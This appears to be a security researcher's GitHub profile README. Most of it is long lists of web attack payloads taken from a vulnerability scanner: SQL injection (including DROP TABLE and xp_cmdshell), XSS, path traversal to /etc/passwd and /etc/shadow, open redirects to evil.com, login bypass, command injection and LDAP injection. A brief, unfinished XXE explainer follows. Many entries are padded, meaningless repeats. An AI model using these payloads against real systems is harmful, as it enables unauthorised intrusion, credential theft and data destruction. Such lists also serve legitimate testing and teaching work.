# ⚡ Cyber Security Researcher ⚡  

## About Me  

<p style="color:#00ff99; font-size:22px; font-family:Courier New; text-shadow:0 0 10px #00ff99;">
🛡️ Ethical Hacker & Cybersecurity Specialist  
</p>

<p style="color:#00ccff; font-size:22px; font-family:Courier New; text-shadow:0 0 10px #00ccff;">
💻 Full Stack Developer & Technology Creator  
</p>

<p style="color:#ff0066; font-size:22px; font-family:Courier New; text-shadow:0 0 10px #ff0066;">
🔍 Bug Hunter & Security Researcher  
</p>

<p style="color:#ffff33; font-size:22px; font-family:Courier New; text-shadow:0 0 10px #ffff33;">
🎓 B.E. Cybersecurity Student (2023–2027)  
</p>

<p style="color:#ff9900; font-size:22px; font-family:Courier New; text-shadow:0 0 10px #ff9900;">
🌟 Innovative Technology Professional  
</p>

---

<p align="center" style="color:#888; font-size:14px; font-family:Courier New;">
🚀 Powered by <b>Cyber Wolf CTF</b> | For Testing & Research Only
</p>


##  # SQL injection payloads - Basic

```
 sql_payloads = [
            "' OR '1'='1",
            "' OR 1=1--",
            "' UNION SELECT NULL--",
            "'; DROP TABLE users--",
            "' OR 'x'='x",
            "1' AND '1'='1",
            "admin'--",
            "' OR 1=1#",
            "' OR 1=1/*",
            "admin' OR '1'='1'--",
            "' UNION SELECT 1,2,3--",
            "' UNION SELECT @@version--",
            "' UNION SELECT database()--",
            "' UNION SELECT user()--",
            "' UNION SELECT current_user--",
            "' UNION SELECT schema_name FROM information_schema.schemata--",
            "' UNION SELECT table_name FROM information_schema.tables--",
            "' UNION SELECT column_name FROM information_schema.columns--",
            "'; EXEC xp_cmdshell('dir')--",
            "'; EXEC master..xp_cmdshell('dir')--",
            "'; WAITFOR DELAY '00:00:05'--",
            "'; SELECT BENCHMARK(5000000,MD5(1))--",
            "'; SELECT SLEEP(5)--",
            "'; SELECT pg_sleep(5)--",
            "'; SELECT * FROM users WHERE id=1 AND (SELECT COUNT(*) FROM information_schema.tables)>0--",
            "'; SELECT * FROM users WHERE id=1 AND (SELECT COUNT(*) FROM information_schema.columns)>0--",
            "'; SELECT * FROM users WHERE id=1 AND (SELECT COUNT(*) FROM users)>0--",
            "'; SELECT * FROM users WHERE id=1 AND (SELECT COUNT(*) FROM users WHERE username='admin')>0--",
            "'; SELECT * FROM users WHERE id=1 AND (SELECT COUNT(*) FROM users WHERE password LIKE '%a%')>0--",
            "'; SELECT * FROM users WHERE id=1 AND (SELECT COUNT(*) FROM users WHERE password LIKE '%admin%')>0--",
            "'; SELECT * FROM users WHERE id=1 AND (SELECT COUNT(*) FROM users WHERE password LIKE '%root%')>0--",
            "'; SELECT * FROM users WHERE id=1 AND (SELECT COUNT(*) FROM users WHERE password LIKE '%test%')>0--",
            "'; SELECT * FROM users WHERE id=1 AND (SELECT COUNT(*) FROM users WHERE password LIKE '%123%')>0--",
            "'; SELECT * FROM users WHERE id=1 AND (SELECT COUNT(*) FROM users WHERE password LIKE '%password%')>0--",
            "'; SELECT * FROM users WHERE id=1 AND (SELECT COUNT(*) FROM users WHERE password LIKE '%secret%')>0--",
            "'; SELECT * FROM users WHERE id=1 AND (SELECT COUNT(*) FROM users WHERE password LIKE '%key%')>0--",
            "'; SELECT * FROM users WHERE id=1 AND (SELECT COUNT(*) FROM users WHERE password LIKE '%token%')>0--",
            "'; SELECT * FROM users WHERE id=1 AND (SELECT COUNT(*) FROM users WHERE password LIKE '%hash%')>0--",
            "'; SELECT * FROM users WHERE id=1 AND (SELECT COUNT(*) FROM users WHERE password LIKE '%md5%')>0--",
            "'; SELECT * FROM users WHERE id=1 AND (SELECT COUNT(*) FROM users WHERE password LIKE '%sha1%')>0--",
            "'; SELECT * FROM users WHERE id=1 AND (SELECT COUNT(*) FROM users WHERE password LIKE '%sha256%')>0--",
            "'; SELECT * FROM users WHERE id=1 AND (SELECT COUNT(*) FROM users WHERE password LIKE '%sha512%')>0--",
            "'; SELECT * FROM users WHERE id=1 AND (SELECT COUNT(*) FROM users WHERE password LIKE '%bcrypt%')>0--",
            "'; SELECT * FROM users WHERE id=1 AND (SELECT COUNT(*) FROM users WHERE password LIKE '%argon2%')>0--",
            "'; SELECT * FROM users WHERE id=1 AND (SELECT COUNT(*) FROM users WHERE password LIKE '%scrypt%')>0--",
            "'; SELECT * FROM users WHERE id=1 AND (SELECT COUNT(*) FROM users WHERE password LIKE '%pbkdf2%')>0--",
            "'; SELECT * FROM users WHERE id=1 AND (SELECT COUNT(*) FROM users WHERE password LIKE '%hmac%')>0--",
            "'; SELECT * FROM users WHERE id=1 AND (SELECT COUNT(*) FROM users WHERE password LIKE '%salt%')>0--",
            "'; SELECT * FROM users WHERE id=1 AND (SELECT COUNT(*) FROM users WHERE password LIKE '%iv%')>0--",
            "'; SELECT * FROM users WHERE id=1 AND (SELECT COUNT(*) FROM users WHERE password LIKE '%nonce%')>0--",
            "'; SELECT * FROM users WHERE id=1 AND (SELECT COUNT(*) FROM users WHERE password LIKE '%challenge%')>0--",
            "'; SELECT * FROM users WHERE id=1 AND (SELECT COUNT(*) FROM users WHERE password LIKE '%response%')>0--",
            "'; SELECT * FROM users WHERE id=1 AND (SELECT COUNT(*) FROM users WHERE password LIKE '%otp%')>0--",
            "'; SELECT * FROM users WHERE id=1 AND (SELECT COUNT(*) FROM users WHERE password LIKE '%totp%')>0--",
            "'; SELECT * FROM users WHERE id=1 AND (SELECT COUNT(*) FROM users WHERE password LIKE '%hotp%')>0--",
            "'; SELECT * FROM users WHERE id=1 AND (SELECT COUNT(*) FROM users WHERE password LIKE '%mfa%')>0--",
            "'; SELECT * FROM users WHERE id=1 AND (SELECT COUNT(*) FROM users WHERE password LIKE '%2fa%')>0--",
            "'; SELECT * FROM users WHERE id=1 AND (SELECT COUNT(*) FROM users WHERE password LIKE '%two%')>0--",
            "'; SELECT * FROM users WHERE id=1 AND (SELECT COUNT(*) FROM users WHERE password LIKE '%factor%')>0--",
            "'; SELECT * FROM users WHERE id=1 AND (SELECT COUNT(*) FROM users WHERE password LIKE '%authenticator%')>0--",
            "'; SELECT * FROM users WHERE id=1 AND (SELECT COUNT(*) FROM users WHERE password LIKE '%google%')>0--",
            "'; SELECT * FROM users WHERE id=1 AND (SELECT COUNT(*) FROM users WHERE password LIKE '%microsoft%')>0--",
            "'; SELECT * FROM users WHERE id=1 AND (SELECT COUNT(*) FROM users WHERE password LIKE '%authy%')>0--",
            "'; SELECT * FROM users WHERE id=1 AND (SELECT COUNT(*) FROM users WHERE password LIKE '%duo%')>0--",
            "'; SELECT * FROM users WHERE id=1 AND (SELECT COUNT(*) FROM users WHERE password LIKE '%okta%')>0--",
            "'; SELECT * FROM users WHERE id=1 AND (SELECT COUNT(*) FROM users WHERE password LIKE '%onelogin%')>0--",
            "'; SELECT * FROM users WHERE id=1 AND (SELECT COUNT(*) FROM users WHERE password LIKE '%ping%')>0--",
            "'; SELECT * FROM users WHERE id=1 AND (SELECT COUNT(*) FROM users WHERE password LIKE '%identity%')>0--",
            "'; SELECT * FROM users WHERE id=1 AND (SELECT COUNT(*) FROM users WHERE password LIKE '%federation%')>0--",
            "'; SELECT * FROM users WHERE id=1 AND (SELECT COUNT(*) FROM users WHERE password LIKE '%saml%')>0--",
            "'; SELECT * FROM users WHERE id=1 AND (SELECT COUNT(*) FROM users WHERE password LIKE '%oauth%')>0--",
            "'; SELECT * FROM users WHERE id=1 AND (SELECT COUNT(*) FROM users WHERE password LIKE '%openid%')>0--",
            "'; SELECT * FROM users WHERE id=1 AND (SELECT COUNT(*) FROM users WHERE password LIKE '%jwt%')>0--",
            "'; SELECT * FROM users WHERE id=1 AND (SELECT COUNT(*) FROM users WHERE password LIKE '%bearer%')>0--",
            "'; SELECT * FROM users WHERE id=1 AND (SELECT COUNT(*) FROM users WHERE password LIKE '%basic%')>0--",
            "'; SELECT * FROM users WHERE id=1 AND (SELECT COUNT(*) FROM users WHERE password LIKE '%digest%')>0--",
            "'; SELECT * FROM users WHERE id=1 AND (SELECT COUNT(*) FROM users WHERE password LIKE '%ntlm%')>0--",
            "'; SELECT * FROM users WHERE id=1 AND (SELECT COUNT(*) FROM users WHERE password LIKE '%kerberos%')>0--",
            "'; SELECT * FROM users WHERE id=1 AND (SELECT COUNT(*) FROM users WHERE password LIKE '%ldap%')>0--",
            "'; SELECT * FROM users WHERE id=1 AND (SELECT COUNT(*) FROM users WHERE password LIKE '%radius%')>0--",
            "'; SELECT * FROM users WHERE id=1 AND (SELECT COUNT(*) FROM users WHERE password LIKE '%tacacs%')>0--",
            "'; SELECT * FROM users WHERE id=1 AND (SELECT COUNT(*) FROM users WHERE password LIKE '%xacml%')>0--",
            "'; SELECT * FROM users WHERE id=1 AND (SELECT COUNT(*) FROM users WHERE password LIKE '%spml%')>0--",
            "'; SELECT * FROM users WHERE id=1 AND (SELECT COUNT(*) FROM users WHERE password LIKE '%dsml%')>0--",
            "'; SELECT * FROM users WHERE id=1 AND (SELECT COUNT(*) FROM users WHERE password LIKE '%scim%')>0--",
            "'; SELECT * FROM users WHERE id=1 AND (SELECT COUNT(*) FROM users WHERE password LIKE '%oauth2%')>0--",
            "'; SELECT * FROM users WHERE id=1 AND (SELECT COUNT(*) FROM users WHERE password LIKE '%openid2%')>0--",
            "'; SELECT * FROM users WHERE id=1 AND (SELECT COUNT(*) FROM users WHERE password LIKE '%openid3%')>0--",
            "'; SELECT * FROM users WHERE id=1 AND (SELECT COUNT(*) FROM users WHERE password LIKE '%openid4%')>0--",
            "'; SELECT * FROM users WHERE id=1 AND (SELECT COUNT(*) FROM users WHERE password LIKE '%openid5%')>0--",
            "'; SELECT * FROM users WHERE id=1 AND (SELECT COUNT(*) FROM users WHERE password LIKE '%openid6%')>0--",
            "'; SELECT * FROM users WHERE id=1 AND (SELECT COUNT(*) FROM users WHERE password LIKE '%openid7%')>0--",
            "'; SELECT * FROM users WHERE id=1 AND (SELECT COUNT(*) FROM users WHERE password LIKE '%openid8%')>0--",
            "'; SELECT * FROM users WHERE id=1 AND (SELECT COUNT(*) FROM users WHERE password LIKE '%openid9%')>0--",
            "'; SELECT * FROM users WHERE id=1 AND (SELECT COUNT(*) FROM users WHERE password LIKE '%openid10%')>0--"
        ]
```


## Test common parameters

```
 test_params = ['id', 'user', 'search', 'q', 'username', 'email', 'page']
        
        for param in test_params:
            for payload in sql_payloads:
                try:
                    test_url = f"{target_url}?{param}={urllib.parse.quote(payload)}"
                    response = self.session.get(test_url)
                    
                    # Check for SQL error patterns
                    sql_errors = [
                        'mysql_fetch_array', 'mysql_num_rows', 'mysql_error',
                        'Warning: mysql', 'MySQLSyntaxErrorException',
                        'valid MySQL result', 'PostgreSQL query failed',
                        'Warning: pg_', 'valid PostgreSQL result',
                        'SQLite/JDBCDriver', 'SQLite.Exception',
                        'Microsoft OLE DB Provider for ODBC Drivers',
                        'Microsoft OLE DB Provider for SQL Server',
                        'Unclosed quotation mark after the character string',
                        'Microsoft JET Database Engine'
                    ]
```


## Basic XSS

```
xss_payloads = [
            # Basic XSS
            '<script>alert("XSS")</script>',
            '<img src=x onerror=alert("XSS")>',
            '<svg onload=alert("XSS")>',
            '"><script>alert("XSS")</script>',
            "';alert('XSS');//",
            '<iframe src="javascript:alert(\'XSS\')">',
            '<body onload=alert("XSS")>',
            '<input type="text" value="" onmouseover="alert(\'XSS\')">',
            
            # Advanced XSS - Filter Bypass
            '<ScRiPt>alert("XSS")</ScRiPt>',
            '<script>alert(String.fromCharCode(88,83,83))</script>',
            '<script>eval(String.fromCharCode(97,108,101,114,116,40,34,88,83,83,34,41))</script>',
            '<script>alert(/XSS/.source)</script>',
            '<script>alert(1)</script>',
            '<script>alert(2)</script>',
            '<script>alert(3)</script>',
            '<script>alert(4)</script>',
            '<script>alert(5)</script>',
            
            # DOM-based XSS
            'javascript:alert("XSS")',
            'javascript:alert(\'XSS\')',
            'javascript:alert(`XSS`)',
            'javascript:alert(String.fromCharCode(88,83,83))',
            'javascript:alert(1)',
            'javascript:alert(2)',
            'javascript:alert(3)',
            'javascript:alert(4)',
            'javascript:alert(5)',
            
            # Event Handlers
            '<img src=x onerror=alert(1)>',
            '<img src=x onerror=alert(2)>',
            '<img src=x onerror=alert(3)>',
            '<img src=x onerror=alert(4)>',
            '<img src=x onerror=alert(5)>',
            '<svg onload=alert(1)>',
            '<svg onload=alert(2)>',
            '<svg onload=alert(3)>',
            '<svg onload=alert(4)>',
            '<svg onload=alert(5)>',
            
            # HTML5 Events
            '<details open ontoggle=alert(1)>',
            '<details open ontoggle=alert(2)>',
            '<details open ontoggle=alert(3)>',
            '<details open ontoggle=alert(4)>',
            '<details open ontoggle=alert(5)>',
            '<video src=x onerror=alert(1)>',
            '<video src=x onerror=alert(2)>',
            '<video src=x onerror=alert(3)>',
            '<video src=x onerror=alert(4)>',
            '<video src=x onerror=alert(5)>',
            
            # CSS-based XSS
            '<div style="background:url(javascript:alert(1))">',
            '<div style="background:url(javascript:alert(2))">',
            '<div style="background:url(javascript:alert(3))">',
            '<div style="background:url(javascript:alert(4))">',
            '<div style="background:url(javascript:alert(5))">',
            
            # Encoded XSS
            '&#60;script&#62;alert(1)&#60;/script&#62;',
            '&#60;script&#62;alert(2)&#60;/script&#62;',
            '&#60;script&#62;alert(3)&#60;/script&#62;',
            '&#60;script&#62;alert(4)&#60;/script&#62;',
            '&#60;script&#62;alert(5)&#60;/script&#62;',
            
            # Unicode XSS
            '\\u003Cscript\\u003Ealert(1)\\u003C/script\\u003E',
            '\\u003Cscript\\u003Ealert(2)\\u003C/script\\u003E',
            '\\u003Cscript\\u003Ealert(3)\\u003C/script\\u003E',
            '\\u003Cscript\\u003Ealert(4)\\u003C/script\\u003E',
            '\\u003Cscript\\u003Ealert(5)\\u003C/script\\u003E',
            
            # Mixed Case
            '<ScRiPt>alert(1)</ScRiPt>',
            '<ScRiPt>alert(2)</ScRiPt>',
            '<ScRiPt>alert(3)</ScRiPt>',
            '<ScRiPt>alert(4)</ScRiPt>',
            '<ScRiPt>alert(5)</ScRiPt>',
            
            # Null Byte
            '<script>alert(1)</script>',
            '<script>alert(2)</script>',
            '<script>alert(3)</script>',
            '<script>alert(4)</script>',
            '<script>alert(5)</script>',
            
            # Double Encoding
            '%253Cscript%253Ealert(1)%253C/script%253E',
            '%253Cscript%253Ealert(2)%253C/script%253E',
            '%253Cscript%253Ealert(3)%253C/script%253E',
            '%253Cscript%253Ealert(4)%253C/script%253E',
            '%253Cscript%253Ealert(5)%253C/script%253E'
        ]
```

 # Unix/Linux Path Traversal

 ```

traversal_payloads = [
            # Unix/Linux Path Traversal
            '../../../etc/passwd',
            '../../../../etc/passwd',
            '../../../../../etc/passwd',
            '../../../../../../etc/passwd',
            '../../../../../../../etc/passwd',
            '../../../../../../../../etc/passwd',
            '../../../../../../../../../etc/passwd',
            '../../../../../../../../../../etc/passwd',
            '../../../../../../../../../../../etc/passwd',
            '../../../../../../../../../../../../etc/passwd',
            
            # Windows Path Traversal
            '..\\..\\..\\windows\\system32\\drivers\\etc\\hosts',
            '..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts',
            '..\\..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts',
            '..\\..\\..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts',
            '..\\..\\..\\..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts',
            '..\\..\\..\\..\\..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts',
            '..\\..\\..\\..\\..\\..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts',
            '..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts',
            '..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts',
            '..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts',
            
            # Mixed Path Traversal
            '../../../windows/win.ini',
            '../../../../windows/win.ini',
            '../../../../../windows/win.ini',
            '../../../../../../windows/win.ini',
            '../../../../../../../windows/win.ini',
            '../../../../../../../../windows/win.ini',
            '../../../../../../../../../windows/win.ini',
            '../../../../../../../../../../windows/win.ini',
            '../../../../../../../../../../../windows/win.ini',
            '../../../../../../../../../../../../windows/win.ini',
            
            # Shadow File Access
            '../../../../etc/shadow',
            '../../../../../etc/shadow',
            '../../../../../../etc/shadow',
            '../../../../../../../etc/shadow',
            '../../../../../../../../etc/shadow',
            '../../../../../../../../../etc/shadow',
            '../../../../../../../../../../etc/shadow',
            '../../../../../../../../../../../etc/shadow',
            '../../../../../../../../../../../../etc/shadow',
            '../../../../../../../../../../../../../etc/shadow',
            
            # Boot Files
            '../../../boot.ini',
            '../../../../boot.ini',
            '../../../../../boot.ini',
            '../../../../../../boot.ini',
            '../../../../../../../boot.ini',
            '../../../../../../../../boot.ini',
            '../../../../../../../../../boot.ini',
            '../../../../../../../../../../boot.ini',
            '../../../../../../../../../../../boot.ini',
            '../../../../../../../../../../../../boot.ini',
            
            # URL Encoded Path Traversal
            '..%2F..%2F..%2Fetc%2Fpasswd',
            '..%2F..%2F..%2F..%2Fetc%2Fpasswd',
            '..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd',
            '..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd',
            '..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd',
            '..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd',
            '..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd',
            '..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd',
            '..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd',
            '..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd',
            
            # Double Dot Path Traversal
            '....//....//....//etc/passwd',
            '....//....//....//....//etc/passwd',
            '....//....//....//....//....//etc/passwd',
            '....//....//....//....//....//....//etc/passwd',
            '....//....//....//....//....//....//....//etc/passwd',
            '....//....//....//....//....//....//....//....//etc/passwd',
            '....//....//....//....//....//....//....//....//....//etc/passwd',
            '....//....//....//....//....//....//....//....//....//....//etc/passwd',
            '....//....//....//....//....//....//....//....//....//....//....//etc/passwd',
            '....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd',
            
            # Alternative Separators
            '..%5C..%5C..%5Cwindows%5Csystem32%5Cdrivers%5Cetc%5Chosts',
            '..%5C..%5C..%5C..%5Cwindows%5Csystem32%5Cdrivers%5Cetc%5Chosts',
            '..%5C..%5C..%5C..%5C..%5Cwindows%5Csystem32%5Cdrivers%5Cetc%5Chosts',
            '..%5C..%5C..%5C..%5C..%5C..%5Cwindows%5Csystem32%5Cdrivers%5Cetc%5Chosts',
            '..%5C..%5C..%5C..%5C..%5C..%5C..%5Cwindows%5Csystem32%5Cdrivers%5Cetc%5Chosts',
            '..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5Cwindows%5Csystem32%5Cdrivers%5Cetc%5Chosts',
            '..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5Cwindows%5Csystem32%5Cdrivers%5Cetc%5Chosts',
            '..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5Cwindows%5Csystem32%5Cdrivers%5Cetc%5Chosts',
            '..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5Cwindows%5Csystem32%5Cdrivers%5Cetc%5Chosts',
            '..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5Cwindows%5Csystem32%5Cdrivers%5Cetc%5Chosts',
            
            # Null Byte Injection
            '../../../etc/passwd%00',
            '../../../../etc/passwd%00',
            '../../../../../etc/passwd%00',
            '../../../../../../etc/passwd%00',
            '../../../../../../../etc/passwd%00',
            '../../../../../../../../etc/passwd%00',
            '../../../../../../../../../etc/passwd%00',
            '../../../../../../../../../../etc/passwd%00',
            '../../../../../../../../../../../etc/passwd%00',
            '../../../../../../../../../../../../etc/passwd%00',
            
            # Double Encoding
            '%252E%252E%252F%252E%252E%252F%252E%252E%252Fetc%252Fpasswd',
            '%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252Fetc%252Fpasswd',
            '%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252Fetc%252Fpasswd',
            '%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252Fetc%252Fpasswd',
            '%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252Fetc%252Fpasswd',
            '%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252Fetc%252Fpasswd',
            '%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252Fetc%252Fpasswd',
            '%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252Fetc%252Fpasswd',
            '%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252Fetc%252Fpasswd'
        ]
```
## "Check for open redirect vulnerabilities
```
 vulnerabilities = []
        
        redirect_payloads = [
            'http://evil.com',
            'https://google.com',
            '//evil.com',
            '/\\evil.com',
            'javascript:alert("redirect")'
        ]
        
```

## # Common authentication bypass payloads

```
bypass_payloads = [
            'admin\' --',
            'admin\' #',
            'admin\'/*',
            'admin\' OR \'1\'=\'1',
            '\'OR 1=1--',
            '\' or 1=1#',
            '\' or 1=1/*'
        ]
```
##  # Command injection payloads

```
 cmd_payloads = [
            # Basic command injection
            '; id',
            '| id',
            '&& id',
            '`id`',
            '$(id)',
            '; cat /etc/passwd',
            '| cat /etc/passwd',
            '; ping -c 1 127.0.0.1',
            '| ping -c 1 127.0.0.1',
            
            # Advanced command injection
            '; id;',
            '| id |',
            '&& id &&',
            '`id`;',
            '$(id);',
            '; id #',
            '| id #',
            '&& id #',
            '`id` #',
            '$(id) #',
            
            # Command chaining
            '; id && whoami',
            '| id | whoami',
            '&& id && whoami',
            '`id` && `whoami`',
            '$(id) && $(whoami)',
            '; id; whoami',
            '| id | whoami |',
            '&& id && whoami &&',
            '`id`; `whoami`',
            '$(id); $(whoami)',
            
            # File operations
            '; cat /etc/passwd',
            '| cat /etc/passwd',
            '&& cat /etc/passwd',
            '`cat /etc/passwd`',
            '$(cat /etc/passwd)',
            '; ls -la',
            '| ls -la',
            '&& ls -la',
            '`ls -la`',
            '$(ls -la)',
            
            # Network commands
            '; ping -c 1 127.0.0.1',
            '| ping -c 1 127.0.0.1',
            '&& ping -c 1 127.0.0.1',
            '`ping -c 1 127.0.0.1`',
            '$(ping -c 1 127.0.0.1)',
            '; nslookup google.com',
            '| nslookup google.com',
            '&& nslookup google.com',
            '`nslookup google.com`',
            '$(nslookup google.com)',
            
            # System information
            '; uname -a',
            '| uname -a',
            '&& uname -a',
            '`uname -a`',
            '$(uname -a)',
            '; hostname',
            '| hostname',
            '&& hostname',
            '`hostname`',
            '$(hostname)',
            
            # Process information
            '; ps aux',
            '| ps aux',
            '&& ps aux',
            '`ps aux`',
            '$(ps aux)',
            '; top -n 1',
            '| top -n 1',
            '&& top -n 1',
            '`top -n 1`',
            '$(top -n 1)',
            
            # User information
            '; who',
            '| who',
            '&& who',
            '`who`',
            '$(who)',
            '; w',
            '| w',
            '&& w',
            '`w`',
            '$(w)',
            
            # Directory listing
            '; pwd',
            '| pwd',
            '&& pwd',
            '`pwd`',
            '$(pwd)',
            '; find . -name "*.txt"',
            '| find . -name "*.txt"',
            '&& find . -name "*.txt"',
            '`find . -name "*.txt"`',
            '$(find . -name "*.txt")',
            
            # Windows commands
            '; dir',
            '| dir',
            '&& dir',
            '`dir`',
            '$(dir)',
            '; ipconfig',
            '| ipconfig',
            '&& ipconfig',
            '`ipconfig`',
            '$(ipconfig)',
            '; systeminfo',
            '| systeminfo',
            '&& systeminfo',
            '`systeminfo`',
            '$(systeminfo)',
            '; tasklist',
            '| tasklist',
            '&& tasklist',
            '`tasklist`',
            '$(tasklist)',
            '; netstat -an',
            '| netstat -an',
            '&& netstat -an',
            '`netstat -an`',
            '$(netstat -an)',
            '; net user',
            '| net user',
            '&& net user',
            '`net user`',
            '$(net user)',
            '; net localgroup',
            '| net localgroup',
            '&& net localgroup',
            '`net localgroup`',
            '$(net localgroup)',
            '; wmic qfe',
            '| wmic qfe',
            '&& wmic qfe',
            '`wmic qfe`',
            '$(wmic qfe)',
            '; wmic os',
            '| wmic os',
            '&& wmic os',
            '`wmic os`',
            '$(wmic os)',
            '; wmic cpu',
            '| wmic cpu',
            '&& wmic cpu',
            '`wmic cpu`',
            '$(wmic cpu)',
            '; wmic memorychip',
            '| wmic memorychip',
            '&& wmic memorychip',
            '`wmic memorychip`',
            '$(wmic memorychip)',
            '; wmic diskdrive',
            '| wmic diskdrive',
            '&& wmic diskdrive',
            '`wmic diskdrive`',
            '$(wmic diskdrive)',
            '; wmic networkadapter',
            '| wmic networkadapter',
            '&& wmic networkadapter',
            '`wmic networkadapter`',
            '$(wmic networkadapter)',
            '; wmic service',
            '| wmic service',
            '&& wmic service',
            '`wmic service`',
            '$(wmic service)',
            '; wmic process',
            '| wmic process',
            '&& wmic process',
            '`wmic process`',
            '$(wmic process)',
            '; wmic startup',
            '| wmic startup',
            '&& wmic startup',
            '`wmic startup`',
            '$(wmic startup)',
            '; wmic share',
            '| wmic share',
            '&& wmic share',
            '`wmic share`',
            '$(wmic share)',
            '; wmic printer',
            '| wmic printer',
            '&& wmic printer',
            '`wmic printer`',
            '$(wmic printer)',
            '; wmic bios',
            '| wmic bios',
            '&& wmic bios',
            '`wmic bios`',
            '$(wmic bios)',
            '; wmic baseboard',
            '| wmic baseboard',
            '&& wmic baseboard',
            '`wmic baseboard`',
            '$(wmic baseboard)',
            '; wmic computersystem',
            '| wmic computersystem',
            '&& wmic computersystem',
            '`wmic computersystem`',
            '$(wmic computersystem)',
            '; wmic environment',
            '| wmic environment',
            '&& wmic environment',
            '`wmic environment`',
            '$(wmic environment)',
            '; wmic timezone',
            '| wmic timezone',
            '&& wmic timezone',
            '`wmic timezone`',
            '$(wmic timezone)',
            '; wmic logicaldisk',
            '| wmic logicaldisk',
            '&& wmic logicaldisk',
            '`wmic logicaldisk`',
            '$(wmic logicaldisk)',
            '; wmic volume',
            '| wmic volume',
            '&& wmic volume',
            '`wmic volume`',
            '$(wmic volume)',
            '; wmic partition',
            '| wmic partition',
            '&& wmic partition',
            '`wmic partition`',
            '$(wmic partition)',
            '; wmic shadowcopy',
            '| wmic shadowcopy',
            '&& wmic shadowcopy',
            '`wmic shadowcopy`',
            '$(wmic shadowcopy)',
            '; wmic shadowstorage',
            '| wmic shadowstorage',
            '&& wmic shadowstorage',
            '`wmic shadowstorage`',
            '$(wmic shadowstorage)',
            '; wmic shadowvolume',
            '| wmic shadowvolume',
            '&& wmic shadowvolume',
            '`wmic shadowvolume`',
            '$(wmic shadowvolume)',
            '; wmic shadowcopy',
            '| wmic shadowcopy',
            '&& wmic shadowcopy',
            '`wmic shadowcopy`',
            '$(wmic shadowcopy)',
            '; wmic shadowstorage',
            '| wmic shadowstorage',
            '&& wmic shadowstorage',
            '`wmic shadowstorage`',
            '$(wmic shadowstorage)',
            '; wmic shadowvolume',
            '| wmic shadowvolume',
            '&& wmic shadowvolume',
            '`wmic shadowvolume`',
            '$(wmic shadowvolume)'
        ]
```

 # Check for command execution indicators

 ```
 cmd_indicators = [
                        'uid=', 'gid=', 'groups=',  # id command output
                        'root:x:0:0:', 'daemon:x:',  # /etc/passwd content
                        'PING', 'ping statistics',   # ping command output
                        '64 bytes from', 'packets transmitted'
                    ]
                    
```

 # LDAP injection payloads

 ```
ldap_payloads = [
            '*',
            '*)(&',
            '*)(|(&',
            '*))(|',
            '*))%00',
            '*)(cn=*))((cn=*',
            '*)(uid=*))(|(uid=*',
            '*)(&(objectClass=*'
        ]
```
<p> XXE stands for XML External Entity attack. It's a type of security vulnerability that affects applications that parse XML input, allowing attackers to interfere with the application's XML processing. 
<h1>Here's a more detailed explanation:</h1>
<h1>XML and External Entities:</h1>
<p>XML (Extensible Markup Language) is a markup language designed for encoding documents in a format that is both human-readable and machine-readable. External entities are components of an XML document that can be defined and referenced from outside the document itself. </p>
<h1>How XXE Attacks Work:</h1>
<p>When an application processes XML data, it may also process any external entities referenced within the document. An attacker can exploit this by crafting malicious XML input that includes references to external entities controlled by the attacker. These external entities can point to sensitive data, local files, or even trigger requests to other servers. </p>
<h1>Potential Impacts:</h1>
<h1>XXE attacks can have various consequences, including: <h1>
<h3>Disclosure of sensitive data: Accessing local files, including system files like /etc/passwd, or other sensitive data stored on the server. </h3>
<p>Denial of service (DoS): Exploiting vulnerabilities in how the parser handles external entities to cause the application to crash or become unresponsive. </p>
<p>Server-Side Request Forgery (SSRF): Forcing the application to make requests to internal or external servers, potentially bypassing network security measures. </p>
<h1>Example:</h1>
